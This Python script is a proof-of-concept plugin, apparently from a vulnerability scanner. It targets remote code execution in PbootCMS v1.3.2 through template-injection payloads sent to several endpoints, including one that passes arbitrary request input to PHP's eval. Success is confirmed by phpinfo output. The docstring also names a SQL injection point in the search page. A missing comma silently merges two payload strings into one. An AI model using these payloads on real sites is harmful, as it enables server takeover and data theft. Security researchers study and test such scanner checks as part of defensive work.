#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    '''
    PbootCMS v1.3.2命令执行
    另外还有 注入： PbootCMS/index.php/Search/index?keyword=pboot&you=gay  注入点在you，搜索型注入
    '''

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'pbootcms 1.3.2rce'
        self.keyword = ['pbootcms']
        self.info = 'PbootCMS v1.3.2 rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in  self.url_normpath(self.url, ['./PbootCMS/', './']):
                    for poc in [
                        "index.php/index/index?keyword={pboot:if(eval($_REQUEST[1]));//)})}}{/pboot:if}&1=phpinfo();"
                        "index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                        "index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                        "index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                        "index.php/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                        "index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo"
                    ]:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res !=None:
                                text = await res.text()
                                if "php.ini" in text:
                                    self.flag = 1
                                    self.req.append({"url": url})
                                    self.res.append({"info": url, "key": "pbootcms v1.3.2 rec"})
                                    break